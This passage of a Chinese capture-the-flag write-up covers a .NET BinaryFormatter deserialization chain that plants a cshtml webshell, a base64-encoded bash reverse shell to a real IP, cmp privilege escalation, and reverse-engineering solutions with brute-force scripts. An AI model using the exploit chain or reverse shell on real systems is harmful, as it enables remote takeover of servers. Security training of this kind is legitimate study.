+        Console.WriteLine("=== End ===");
+    }
+
+    public static object Deserialize(string s)
+    {
+        AppContext.SetSwitch("Switch.System.Runtime.Serialization.SerializationGuard.AllowFileWrites", true);
+        object obj;
+        using (MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(s)))
+        {
+            object deserialize = new BinaryFormatter
+            {
+                Binder = new MySecBinder()
+            }.Deserialize(memoryStream);
+            obj = deserialize;
+        }
+        return obj;
+    }
+    public static string Generate()
+    {
+        string base64String = "QHsKICAgIExheW91dCA9IG51bGw7CiAgICBzdHJpbmcgb3V0cHV0ID0gIiI7CiAgICB0cnkKICAgIHsKICAgICAgICB2YXIgcHJvY2Vzc0Fzc2VtYmx5ID0gU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkuTG9hZCgiU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MiKTsKICAgICAgICB2YXIgcHNpVHlwZSA9IHByb2Nlc3NBc3NlbWJseS5HZXRUeXBlKCJTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc1N0YXJ0SW5mbyIpOwogICAgICAgIHZhciBwcm9jZXNzVHlwZSA9IHByb2Nlc3NBc3NlbWJseS5HZXRUeXBlKCJTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyIpOwogICAgICAgIHZhciBwc2kgPSBTeXN0ZW0uQWN0aXZhdG9yLkNyZWF0ZUluc3RhbmNlKHBzaVR5cGUpOwogICAgICAgIHBzaVR5cGUuR2V0UHJvcGVydHkoIkZpbGVOYW1lIikuU2V0VmFsdWUocHNpLCAiYmFzaCIpOwogICAgICAgIHBzaVR5cGUuR2V0UHJvcGVydHkoIkFyZ3VtZW50cyIpLlNldFZhbHVlKHBzaSwgIi1jIFwiYmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMjIuNTEuMTM3Lzk5OTkgMD4mMVwiIik7CiAgICAgICAgcHNpVHlwZS5HZXRQcm9wZXJ0eSgiUmVkaXJlY3RTdGFuZGFyZE91dHB1dCIpLlNldFZhbHVlKHBzaSwgdHJ1ZSk7CiAgICAgICAgcHNpVHlwZS5HZXRQcm9wZXJ0eSgiUmVkaXJlY3RTdGFuZGFyZEVycm9yIikuU2V0VmFsdWUocHNpLCB0cnVlKTsKICAgICAgICBwc2lUeXBlLkdldFByb3BlcnR5KCJVc2VTaGVsbEV4ZWN1dGUiKS5TZXRWYWx1ZShwc2ksIGZhbHNlKTsKICAgICAgICBwc2lUeXBlLkdldFByb3BlcnR5KCJDcmVhdGVOb1dpbmRvdyIpLlNldFZhbHVlKHBzaSwgdHJ1ZSk7CiAgICAgICAgdmFyIHN0YXJ0TWV0aG9kID0gcHJvY2Vzc1R5cGUuR2V0TWV0aG9kKCJTdGFydCIsIG5ld1tdIHsgcHNpVHlwZSB9KTsKICAgICAgICB2YXIgcHJvY2VzcyA9IHN0YXJ0TWV0aG9kLkludm9rZShudWxsLCBuZXcgb2JqZWN0W10geyBwc2kgfSk7CiAgICAgICAgdmFyIHN0ZE91dFByb3BlcnR5ID0gcHJvY2Vzc1R5cGUuR2V0UHJvcGVydHkoIlN0YW5kYXJkT3V0cHV0Iik7CiAgICAgICAgdmFyIHN0ZE91dFJlYWRlciA9IChTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKXN0ZE91dFByb3BlcnR5LkdldFZhbHVlKHByb2Nlc3MpOwogICAgICAgCiAgICAgICAgb3V0cHV0ID0gc3RkT3V0UmVhZGVyLlJlYWRUb0VuZCgpOwoKICAgICAgICB2YXIgc3RkRXJyUHJvcGVydHkgPSBwcm9jZXNzVHlwZS5HZXRQcm9wZXJ0eSgiU3RhbmRhcmRFcnJvciIpOwogICAgICAgIHZhciBzdGRFcnJSZWFkZXIgPSAoU3lzdGVtLklPLlN0cmVhbVJlYWRlcilzdGRFcnJQcm9wZXJ0eS5HZXRWYWx1ZShwcm9jZXNzKTsKICAgICAgICBzdHJpbmcgZXJyb3JPdXRwdXQgPSBzdGRFcnJSZWFkZXIuUmVhZFRvRW5kKCk7CgogICAgICAgIHZhciB3YWl0Rm9yRXhpdE1ldGhvZCA9IHByb2Nlc3NUeXBlLkdldE1ldGhvZCgiV2FpdEZvckV4aXQiLCBTeXN0ZW0uVHlwZS5FbXB0eVR5cGVzKTsKICAgICAgICB3YWl0Rm9yRXhpdE1ldGhvZC5JbnZva2UocHJvY2VzcywgbnVsbCk7CgogICAgICAgIGlmICghc3RyaW5nLklzTnVsbE9yV2hpdGVTcGFjZShlcnJvck91dHB1dCkpCiAgICAgICAgewogICAgICAgICAgICBvdXRwdXQgKz0gIlxuW3N0ZGVycl1cbiIgKyBlcnJvck91dHB1dDsKICAgICAgICB9CiAgICB9CiAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgewogICAgICAgIG91dHB1dCA9ICLpgJrov4flj43lsITmiafooYzlkb3ku6Tml7blh7rplJk6XG4iICsgZXguVG9TdHJpbmcoKTsKICAgIH0KfQo8cHJlPkBvdXRwdXQ8L3ByZT4=";
+        byte[] bytes = Convert.FromBase64String(base64String);
+        string payload = System.Text.Encoding.UTF8.GetString(bytes);
+        var invokerTransformer0 = new InvokeTransformer
+        {
+            methodName = "SetMyClass",
+            methodParam = new object[] { "System.IO.File, System.IO.FileSystem" },
+            typeName = "ClassLibrary1.CompareImpl`1[System.String], ClassLibrary1"
+        };
+        var invokerTransformer1 = new InvokeTransformer
+        {
+            methodName = "SetMyMethod",
+            methodParam = new object[] { "WriteAllText" },
+            typeName = "ClassLibrary1.CompareImpl`1[System.String], ClassLibrary1"
+        };
+        var invokeTransformer = new InvokeTransformer
+        {
+            methodName = "MyCompare",
+            methodParam = new object[] { "/app/Looking/My/Eyes.cshtml",payload, "w1ndc0me" },
+            typeName = "ClassLibrary1.CompareImpl`1[System.String], ClassLibrary1"
+        };
+
+        var chainedTransformer = new ChainedTransformer();
+        SetPrivateField(chainedTransformer, "_transformers", new InvokeTransformer[] { invokerTransformer0, invokerTransformer1, invokeTransformer });
+
+        var indirectBean = new IndirectBean();
+        SetPrivateField(indirectBean, "_transform", chainedTransformer);
+        SetPrivateField(indirectBean, "bean", new CompareImpl<string>());
+
+        var entryPointBean = new DirectBean();
+        SetPrivateField(entryPointBean, "s", indirectBean);
+        var formatter = new BinaryFormatter();
+        using (var stream = new MemoryStream())
+        {
+            formatter.Serialize(stream, entryPointBean);
+            return Convert.ToBase64String(stream.ToArray());
+        }
+    }
+
+    private static void SetPrivateField(object obj, string fieldName, object value)
+    {
+        Type type = obj.GetType();
+        BindingFlags flags = BindingFlags.NonPublic | BindingFlags.Instance;
+        FieldInfo field = type.GetField(fieldName, flags);
+        field.SetValue(obj, value);
+    }
+}
+```
+
+需要注意这里利用的是cshtml，由于系统是编译之后的，所以需要反射调用恶意dll
+
+```Java
+@{
+    Layout = null;
+    string output = "";
+    try
+    {
+        var processAssembly = System.Reflection.Assembly.Load("System.Diagnostics.Process");
+        var psiType = processAssembly.GetType("System.Diagnostics.ProcessStartInfo");
+        var processType = processAssembly.GetType("System.Diagnostics.Process");
+        var psi = System.Activator.CreateInstance(psiType);
+        psiType.GetProperty("FileName").SetValue(psi, "bash");
+        psiType.GetProperty("Arguments").SetValue(psi, "-c \"bash -i >& /dev/tcp/ip/port 0>&1\"");
+        psiType.GetProperty("RedirectStandardOutput").SetValue(psi, true);
+        psiType.GetProperty("RedirectStandardError").SetValue(psi, true);
+        psiType.GetProperty("UseShellExecute").SetValue(psi, false);
+        psiType.GetProperty("CreateNoWindow").SetValue(psi, true);
+        var startMethod = processType.GetMethod("Start", new[] { psiType });
+        var process = startMethod.Invoke(null, new object[] { psi });
+        var stdOutProperty = processType.GetProperty("StandardOutput");
+        var stdOutReader = (System.IO.StreamReader)stdOutProperty.GetValue(process);
+        output = stdOutReader.ReadToEnd();
+        var stdErrProperty = processType.GetProperty("StandardError");
+        var stdErrReader = (System.IO.StreamReader)stdErrProperty.GetValue(process);
+        string errorOutput = stdErrReader.ReadToEnd();
+
+        var waitForExitMethod = processType.GetMethod("WaitForExit", System.Type.EmptyTypes);
+        waitForExitMethod.Invoke(process, null);
+
+        if (!string.IsNullOrWhiteSpace(errorOutput))
+        {
+            output += "\n[stderr]\n" + errorOutput;
+        }
+    }
+    catch (Exception ex)
+    {
+        output = "通过反射执行命令时出错:\n" + ex.ToString();
+    }
+}
+<pre>@output</pre>
+```
+
+出题人还设置了一个坑点，在反序列化的时候过滤了，使用了return null这样是没用的。
+
+![img](9171acd8-b3f4-489e-b563-975875b31e8c.png)
+
+rce之后，需要用cmp进行提权。
+
+https://gtfobins.github.io/gtfobins/cmp/
+
+# Reverse
+
+## TemporalParadox
+
+main开头有花指令，nop掉跳转jmp即可反编译。动态调试跑一轮就知道各个函数的功能
+
+```C++
+__int64 __fastcall sub_140001D05(__int64 a1, __int64 a2)
+{
+  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]
+
+  sub_140002180(a1, a2);
+  sub_14000A510(a1, a2, v2, (unsigned int)v53, v3, v4);
+  v58 = get_time(a1, a2, v5, 0, v6, v7);
+  if ( v58 > 1751990400 && v58 <= 1752052051 )
+  {
+    gen_query(a1, a2, v8, (unsigned int)v49, v9, v10);
+    v57 = &v54;
+    v12 = std::string::c_str(a1, a2, v11, v49);
+    v15 = md5(a1, a2, v12, (unsigned int)v53, v13, v14, v41);
+    sub_14000A820(a1, a2, v15, (unsigned int)v50, (unsigned int)&v54, v16, v42, v47);
+    sub_14000A6E0(a1, a2, v17, (unsigned int)&v54, v18, v19, v43);
+    v20 = std::operator<<<std::char_traits<char>>(a1, a2, "query: ", &std::cout);
+    v21 = std::operator<<<char>(a1, a2, v49, v20);
+    std::ostream::operator<<(a1, a2, &std::endl<char,std::char_traits<char>>, v21);
+    v22 = std::operator<<<char>(a1, a2, v50, &std::cout);
+    std::ostream::operator<<(a1, a2, &std::endl<char,std::char_traits<char>>, v22);
+    std::string::~string(a1, a2, v23, v50);
+    std::string::~string(a1, a2, v24, v49);
+  }
+  std::string::basic_string(a1, a2, v8, v52);
+  v25 = std::operator<<<std::char_traits<char>>(a1, a2, "Please input the right query string I used:", &std::cout);
+  std::ostream::operator<<(a1, a2, &std::endl<char,std::char_traits<char>>, v25);
+  std::operator>><char>(a1, a2, v52, &std::cin);
+  v56 = &v55;
+  v27 = std::string::c_str(a1, a2, v26, v52);
+  v30 = md5(a1, a2, v27, (unsigned int)v53, v28, v29, v41);
+  sub_14000A820(a1, a2, v30, (unsigned int)v51, (unsigned int)&v55, v31, v44, v47);
+  sub_14000A6E0(a1, a2, v32, (unsigned int)&v55, v33, v34, v45);
+  if ( (unsigned __int8)sub_14000A8E0(
+                          a1,
+                          a2,
+                          (unsigned int)"8a2fc1e9e2830c37f8a7f51572a640aa",
+                          (unsigned int)v51,
+                          v35,
+                          v36,
+                          v46,
+                          v48) )
+    v37 = std::operator<<<std::char_traits<char>>(a1, a2, "Congratulations!", &std::cout);
+  else
+    v37 = std::operator<<<std::char_traits<char>>(a1, a2, "Wrong!", &std::cout);
+  std::ostream::operator<<(a1, a2, &std::endl<char,std::char_traits<char>>, v37);
+  std::string::~string(a1, a2, v38, v51);
+  std::string::~string(a1, a2, v39, v52);
+  return 0LL;
+}
+```
+
+可以看出我们需要得到正确的query并满足query md5加密后的值等于8a2fc1e9e2830c37f8a7f51572a640aa；if里是对时间的判断显然是告诉我们要爆破的话时间范围是(1751990400,1752052051)
+
+进入gen_query可以看到各个参数的生成，可以看到两种query，一种是满足pow_like函数的判断则没有a、b、x、y参数，但多了cipher参数；get_rand是模拟生成随机数
+
+```C++
+__int64 __fastcall sub_140001963(
+        __time64_t *a1,
+        __int64 a2,
+        int a3,
+        __int64 a4,
+        int a5,
+        int a6,
+        double a7,
+        double a8,
+        double a9,
+        double a10)
+{
+  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]
+
+  sub_140001518((_DWORD)a1, a2, a3, (unsigned int)v51, a5, a6);
+  time = get_time(a1);
+  sub_1400014B5((_DWORD)a1, a2, v10, time, v11, v12);
+  v58 = 0;
+  v57 = 0;
+  v56 = 0;
+  v55 = 0;
+  for ( i = 0; i < (int)gen_rand(); ++i )
+  {
+    v58 = gen_rand();
+    v57 = gen_rand();
+    v56 = gen_rand();
+    v55 = gen_rand();
+  }
+  v52 = gen_rand();
+  std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::basic_stringstream(a1, a2, v13, v49);
+  v14 = (double)dword_14000B0E0;
+  v15 = (double)(int)(v58 | v56);
+  v18 = v14 * pow_like(v15, 2.0, v15, a10, v16, v17, (double)dword_14000B0E0);
+  v19 = (double)dword_14000B0E4;
+  if ( v18 == pow_like((double)(int)(v57 | v55), 2.0, v15, (double)(int)(v57 | v55), v20, v21, v18) * v19 )
+  {
+    v22 = std::operator<<<std::char_traits<char>>(a1, a2, "salt=", v50);
+    v23 = std::operator<<<char>(a1, a2, v51, v22);
+    v24 = std::operator<<<std::char_traits<char>>(a1, a2, "&t=", v23);
+    v25 = std::ostream::operator<<(a1, a2, time, v24);
+    v26 = std::operator<<<std::char_traits<char>>(a1, a2, "&r=", v25);
+    v27 = std::ostream::operator<<(a1, a2, v52, v26);
+    v28 = std::operator<<<std::char_traits<char>>(a1, a2, "&cipher=", v27);
+    v31 = sub_14000184D((_DWORD)a1, a2, time, v52, v29, v30, v48);
+    std::ostream::operator<<(a1, a2, v31, v28);
+  }
+  else
+  {
+    v32 = std::operator<<<std::char_traits<char>>(a1, a2, "salt=", v50);
+    v33 = std::operator<<<char>(a1, a2, v51, v32);
+    v34 = std::operator<<<std::char_traits<char>>(a1, a2, "&t=", v33);
+    v35 = std::ostream::operator<<(a1, a2, time, v34);
+    v36 = std::operator<<<std::char_traits<char>>(a1, a2, "&r=", v35);
+    v37 = std::ostream::operator<<(a1, a2, v52, v36);
+    v38 = std::operator<<<std::char_traits<char>>(a1, a2, "&a=", v37);
+    v39 = std::ostream::operator<<(a1, a2, v58, v38);
+    v40 = std::operator<<<std::char_traits<char>>(a1, a2, "&b=", v39);
+    v41 = std::ostream::operator<<(a1, a2, v57, v40);
+    v42 = std::operator<<<std::char_traits<char>>(a1, a2, "&x=", v41);
+    v43 = std::ostream::operator<<(a1, a2, v56, v42);
+    v44 = std::operator<<<std::char_traits<char>>(a1, a2, "&y=", v43);
+    std::ostream::operator<<(a1, a2, v55, v44);
+  }
+  std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::str(a1, a2, v49, a4);
+  std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::~basic_stringstream(a1, a2, v45, v49);
+  std::string::~string(a1, a2, v46, v51);
+  return a4;
+}
+__int64 gen_rand()
+{
+  unsigned int v1; // [rsp+Ch] [rbp-4h]
+
+  v1 = (((dword_14000B040 << 13) ^ (unsigned int)dword_14000B040) >> 17) ^ (dword_14000B040 << 13) ^ dword_14000B040;
+  dword_14000B040 = (32 * v1) ^ v1;
+  return dword_14000B040 & 0x7FFFFFFF;
+}
+__int64 __fastcall sub_1400014B5(_DWORD a1, _DWORD a2, _DWORD a3, unsigned int a4)
+{
+  __int64 result; // rax
+  unsigned int v5; // [rsp+10h] [rbp+10h]
+
+  v5 = a4;
+  if ( !a4 )
+    v5 = 1;
+  result = v5;
+  dword_14000B040 = v5;
+  return result;
+}
+```
+
+调试可以发现dword_14000B040初始值为get_time返回的time，此外salt值固定为tlkyeueq7fej8vtzitt26yl24kswrgm5，因此a、b、x、y实际上都和t相关
+
+因此首先我写了个python脚本来爆破（c不擅长，部分函数如sub_14000184D直接让gemini分析生成模拟代码，但事后发现其实没用到）
+
+```Python
+import math
+from hashlib import md5, sha1
+
+def gen(dword):
+    v1 = ((((dword << 13)&0xffffffff) ^ dword) >> 17) ^ ((dword << 13)&0xffffffff) ^ dword
+    dword = (((32 * v1)&0xffffffff) ^ v1) &0xffffffff
+    return dword, dword & 0x7FFFFFFF
+
+
+S_BOX_TABLE_7FF65E2BC020 = [0x0000000E, 0x00000004, 0x0000000D, 0x00000001, 0x00000002, 0x0000000F, 0x0000000B, 0x00000008, 0x00000003, 0x0000000A, 0x00000006, 0x0000000C, 0x00000005, 0x00000009, 0x00000000, 0x00000007]
+
+P_BOX_TABLE_7FF65E2BC0A0 = [0x00000001, 0x00000005, 0x00000009, 0x0000000D, 0x00000002, 0x00000006, 0x0000000A, 0x0000000E, 0x00000003, 0x00000007, 0x0000000B, 0x0000000F, 0x00000004, 0x00000008, 0x0000000C, 0x00000010]
+
+
+def to_u32(n):
+    """将一个数转换为32位无符号整数"""
+    return n & 0xFFFFFFFF
+
+
+def to_s32(n):
+    """将一个数转换为32位有符号整数"""
+    n = n & 0xFFFFFFFF
+    if n & 0x80000000:
+        return n - 0x100000000
+    return n
+
+
+def generate_salt(dword_array):
+    """
+    对应 C++ 函数 sub_7FF65E2B1518
+    根据硬编码的 dword 数组生成一个32字符的 salt 字符串。
+    """
+    if not dword_array:
+        raise ValueError("错误: dword_7FF65E2BB060 数组为空，请填写数据。")
+
+    s = []
+    for i in range(32):
+        v9 = dword_array[i]
+        v10 = 0
+
+        # C++ int 是32位的，Python int 是无限精度的，需要模拟32位行为
+        v9_s32 = to_s32(v9)
+
+        if v9_s32 >= 0:
+            v10 = v9_s32 / 3 + 48
+        elif v9_s32 >= -728:
+            # ~v9 在C++中是对32位整数按位取反
+            v10 = ~v9_s32 & 0xFFFFFFFF
+        else:
+            # 这里的 sub_7FF65E2B31D0 / 1.0986... 被我们分析为 log3
+            # math.log(x) 是 ln(x)，math.log(3) 是 ln(3)
+            # log3(x) = ln(x) / ln(3)
+            try:
+                log_val = math.log(-v9_s32) / math.log(3)
+                v10 = log_val - 6.0 + 48.0
+            except ValueError:
+                # 如果 -v9_s32 <= 0，log会出错，这里设置一个默认值
+                v10 = 48  # '0'
+
+        # 将计算结果转换为字符
+        s.append(chr(int(v10) & 0xFF))
+
+    return "".join(s)
+
+
+def s_box_transform(state, s_box_table):
+    """
+    对应 C++ 函数 sub_7FF65E2B16C1 (S-盒替换)
+    """
+    if not s_box_table:
+        raise ValueError("错误: S_BOX_TABLE_7FF65E2BC020 数组为空，请填写数据。")
+
+    s = to_u32(state)
+    for _ in range(4):
+        # 提取高4位作为索引
+        index = (s >> 12) & 0xF
+        sbox_val = s_box_table[index]
+        # (16 * s) 等价于 (s << 4)
+        s = sbox_val | (s << 4)
+    return to_u32(s)
+
+
+def p_box_transform(state, p_box_table):
+    """
+    对应 C++ 函数 sub_7FF65E2B1785 (P-盒置换)
+    """
+    if not p_box_table:
+        raise ValueError("错误: P_BOX_TABLE_7FF65E2BC0A0 数组为空，请填写数据。")
+
+    s = to_u32(state)
+    new_state = 0
+    for i in range(16):
+        # 获取源比特的位置 (C数组是1-based, Python是0-based)
+        source_bit_pos = p_box_table[i] - 1
+        # 检查源比特是否为1
+        if (s >> source_bit_pos) & 1:
+            # 如果是1，则在目标位置i设置比特
+            new_state |= (1 << i)
+    return new_state
+
+
+def round_function(state, s_box_table, p_box_table):
+    """
+    对应 C++ 函数 sub_7FF65E2B17F7 (轮函数)
+    """
+    state = s_box_transform(state, s_box_table)
+    state = p_box_transform(state, p_box_table)
+    return state
+
+
+def generate_round_key(key, round_num):
+    """
+    对应 C++ 函数 sub_7FF65E2B16A0 (轮密钥生成)
+    """
+    key_u32 = to_u32(key)
+    shift_amount = 4 * (round_num - 1)
+    # C++ 代码中 (unsigned int) >> 是逻辑右移
+    shifted_key = key_u32 << shift_amount
+    return to_u32(shifted_key) >> 16
+
+
+def encrypt_token(timestamp, r_key, s_box_table, p_box_table):
+    """
+    对应 C++ 函数 sub_7FF65E2B184D (加密主函数)
+    """
+    state = to_u32(timestamp)
+
+    # 循环 3 轮
+    for i in range(1, 4):
+        round_key = generate_round_key(r_key, i)
+        state ^= round_key
+        state = round_function(state, s_box_table, p_box_table)
+
+    # 循环后的第4步
+    round_key_4 = generate_round_key(r_key, 4)
+    state ^= round_key_4
+    state = s_box_transform(state, s_box_table)
+
+    # 最终返回前的第5步
+    round_key_5 = generate_round_key(r_key, 5)
+    final_state = state ^ round_key_5
+
+    return to_u32(final_state)
+
+
+for t in range(1751990400, 1752052052):
+    dword = t
+    dword, ret = gen(dword)
+    cnt = ret
+    i = 0
+    while i < cnt:
+        dword, ret = gen(dword)
+        a = ret
+        dword, ret = gen(dword)
+        b = ret
+        dword, ret = gen(dword)
+        x = ret
+        dword, ret = gen(dword)
+        y = ret
+        dword, ret = gen(dword)
+        cnt = ret
+        i+=1
+    dword, ret = gen(dword)
+    r = ret
+    # pow(a | x, 2)
+    val1 = math.pow(float(to_s32(a) | to_s32(x)), 2.0)
+    # pow(b | y, 2)
+    val2 = math.pow(float(to_s32(b) | to_s32(y)), 2.0)
+
+    if math.isclose(0x61 * val1, 0xb * val2):
+        cipher = encrypt_token(
+            t, r,
+            S_BOX_TABLE_7FF65E2BC020,
+            P_BOX_TABLE_7FF65E2BC0A0
+        )
+        query = f"salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&t={t}&r={r}&cipher={cipher}"
+    else:
+        query = f"salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&t={t}&r={r}&a={a}&b={b}&x={x}&y={y}"
+    print(t, query)
+    if md5(query.encode()).hexdigest() == "8a2fc1e9e2830c37f8a7f51572a640aa":
+        print(sha1(query.encode()).hexdigest())
+```
+
+但python爆破速度非常慢，直接让gemini转为c语言脚本
+
+```C++
+#include <stdio.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <string.h>
+#include <math.h>
+// 引入 OpenSSL 库头文件
+#include <openssl/md5.h>
+#include <openssl/sha.h>
+
+
+// 伪随机数生成器，对应 python 的 gen 函数
+// 使用指针来返回两个值
+void gen(uint32_t* dword, uint32_t* ret) {
+    uint32_t v1 = ((((*dword << 13) ^ *dword) >> 17) ^ ((*dword << 13) ^ *dword));
+    *dword = (32 * v1) ^ v1;
+    *ret = *dword & 0x7FFFFFFF;
+}
+
+// 辅助函数：将二进制哈希值转换为十六进制字符串
+void bytes_to_hex(const unsigned char* bytes, char* hex_string, size_t len) {
+    for (size_t i = 0; i < len; ++i) {
+        sprintf(hex_string + (i * 2), "%02x", bytes[i]);
+    }
+    hex_string[len * 2] = '\0';
+}
+
+
+int main() {
+    const char* target_md5 = "8a2fc1e9e2830c37f8a7f51572a640aa";
+
+    for (uint32_t t = 1751990400; t < 1752052052; ++t) {
+        uint32_t dword = t;
+        uint32_t ret;
+
+        // 初始 gen 调用
+        gen(&dword, &ret);
+        uint32_t cnt = ret;
+
+        uint32_t a = 0, b = 0, x = 0, y = 0;
+        int i = 0;
+        while (i < cnt) {
+            gen(&dword, &a);
+            gen(&dword, &b);
+            gen(&dword, &x);
+            gen(&dword, &y);
+            gen(&dword, &cnt);
+            i++;
+        }
+
+        uint32_t r;
+        gen(&dword, &r);
+        // C中需要更大的缓冲区来格式化字符串
+        char query[512];
+        snprintf(query, sizeof(query), "salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&t=%u&r=%u&a=%u&b=%u&x=%u&y=%u", t, r, a, b, x, y);
+        printf("%u %s\n", t, query);
+        fflush(stdout); // 强制刷新输出缓冲区，确保立即看到打印
+
+        // 计算 MD5
+        unsigned char md5_result[MD5_DIGEST_LENGTH];
+        MD5((unsigned char*)query, strlen(query), md5_result);
+
+        char md5_hex[MD5_DIGEST_LENGTH * 2 + 1];
+        bytes_to_hex(md5_result, md5_hex, MD5_DIGEST_LENGTH);
+        
+        // 比较 MD5
+        if (strcmp(md5_hex, target_md5) == 0) {
+            printf("Found MD5 match!\n");
+            // 计算并打印 SHA1
+            unsigned char sha1_result[SHA_DIGEST_LENGTH];
+            SHA1((unsigned char*)query, strlen(query), sha1_result);
+            
+            char sha1_hex[SHA_DIGEST_LENGTH * 2 + 1];
+            bytes_to_hex(sha1_result, sha1_hex, SHA_DIGEST_LENGTH);
+            
+            printf("SHA1: %s\n", sha1_hex);
+            break; // 找到结果，退出循环
+        }
+    }
+
+    return 0;
+} 
+```
+
+`gcc ./paradox_solve.c -o solve -lssl -lcrypto -lm`
+
+![img](120aaaf1-4c0c-4433-b770-fbd9cab49792.png)
+
+得到正确query的sha1结果
+
+## ez_android
+
+![img](b498a370-9988-401a-af1e-bb924e26edaf.png)
+
+TauriActivity特征，需要去解包静态资源，本来想着直接Hook Webview直接调试的，结果不知道为啥一hook就进不去程序，无奈只能老老实实解包看看咋个事情
+
+![img](f4783aca-b0da-44ae-bf1d-03e9a30c2376.png)
+
+首先看静态资源表，这里分别是name nameLen contentPtr contentSize，那么就解压size就行
+
+翻了一下去年L3H的脚本居然还能用
+
+解包都是这个脚本，地址的话就是压缩内容的范围
+
+```Python
+import os
+
+addr = 0x140371D3A # 这里的地址是压缩内容的地址
+endadd = 0x1403772A8-1
+dump = [0] * (endadd - addr)
+
+for i in range(addr, endadd):
+    dump[i - addr] = get_wide_byte(i)
+
+file_path = r'D:\算法训练\一堆比赛\L3H\dump.br'
+
+with open(file_path, 'wb') as file:
+    file.write(bytes(dump))
+
+print(f"Dump written to {file_path}")
+import brotli
+
+compressed_file_path = "dump.br"
+output_file_path = "dumpp"
+
+
+content = open(compressed_file_path, "rb").read()
+print(f"Compressed file size: {len(content)} bytes")
+
+
+def try_decompress(data):
+    try:
+        return brotli.decompress(data)
+    except brotli.error:
+        return None
+
+
+for i in range(len(content), 0, -1):
+    decompressed = try_decompress(content[:i])
+    if decompressed:
+        break
+
+
+if decompressed:
+    open(output_file_path, "wb").write(decompressed)
+    print(f"Decompressed content written to {output_file_path}")
+else:
+    print("Failed to decompress the content.")
+```
+
+解压缩后看index
+
+![img](cf40c0f2-9dc4-4485-8502-4a4f93873567.png)
+
+没啥东西，单纯就一加载js
+
+![img](721c13ef-3482-4f76-8952-e88da3af6942.png)
+
+js和这个rust后端交互，后端的接口是greet，并且前端未作加密，我们可以直接逆后端。
+
+那既然知道了greet就直接搜索greet就可
+
+![img](f8b016e5-af45-4709-afb9-0e7f58f07253.png)
+
+![img](d02f74b8-7ad3-4ee5-9c32-6eda99684bb9.png)
+
+逻辑清晰明了
+
+解密代码如下：
+
+```Python
+xor = [0x70, 0x6F, 0x69, 0x73, 0x6F, 0x6E, 0x65, 0x64, 0x20, 0x77, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x20, 0x72, 0x65, 0x73, 0x6F, 0x75, 0x72, 0x63, 0x65, 0x73, 0x20, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x55, 0x6E, 0x72, 0x65, 0x61, 0x63, 0x68, 0x61, 0x62, 0x6C, 0x65, 0x57, 0x65, 0x62, 0x76, 0x69, 0x65, 0x77, 0x49, 0x6E, 0x76, 0x6F, 0x6B, 0x65, 0x52, 0x65, 0x6A, 0x65, 0x63, 0x74, 0x65, 0x64, 0x43, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x44, 0x65, 0x73, 0x65, 0x72, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x52, 0x65, 0x73, 0x70, 0x6F, 0x6E, 0x73, 0x65, 0x43, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x53, 0x65, 0x72, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x50, 0x61, 0x79, 0x6C, 0x6F, 0x61, 0x64, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x20, 0x64, 0x65, 0x73, 0x65, 0x72, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x69, 0x6E, 0x67, 0x20, 0x27, 0x70, 0x6C, 0x75, 0x67, 0x69, 0x6E, 0x73, 0x2E, 0x27, 0x20, 0x77, 0x69, 0x74, 0x68, 0x69, 0x6E, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x54, 0x61, 0x75, 0x72, 0x69, 0x20, 0x63, 0x6F, 0x6E, 0x66, 0x69, 0x67, 0x75, 0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x3A, 0x20, 0x73, 0x72, 0x63, 0x5C, 0x6C, 0x69, 0x62, 0x2E, 0x72, 0x73, 0x64, 0x47, 0x68, 0x70, 0x63, 0x32, 0x6C, 0x7A, 0x59, 0x57, 0x74, 0x6C, 0x65, 0x51, 0x57, 0x72, 0x6F, 0x6E, 0x67, 0x20, 0x61, 0x6E, 0x73, 0x77, 0x65, 0x72, 0x61, 0x74, 0x74, 0x65, 0x6D, 0x70, 0x74, 0x20, 0x74, 0x6F, 0x20, 0x75, 0x6E, 0x77, 0x69, 0x6E, 0x64, 0x20, 0x6F, 0x75, 0x74, 0x20, 0x6F, 0x66, 0x20, 0x60, 0x72, 0x75, 0x73, 0x74, 0x60, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x65, 0x72, 0x72, 0x3A, 0x20, 0x75, 0x6E, 0x61, 0x62, 0x6C, 0x65, 0x20, 0x74, 0x6F, 0x20, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x20, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x38, 0x4D, 0x69, 0x42, 0x20, 0x73, 0x74, 0x61, 0x63, 0x6B, 0x65, 0x72, 0x72, 0x6F, 0x72, 0x20, 0x77, 0x68, 0x69, 0x6C, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x74, 0x61, 0x75, 0x72, 0x69, 0x20, 0x61, 0x70, 0x70, 0x6C, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x74, 0x68, 0x65, 0x20, 0x67, 0x65, 0x6E, 0x65, 0x72, 0x61, 0x74, 0x65, 0x64, 0x20, 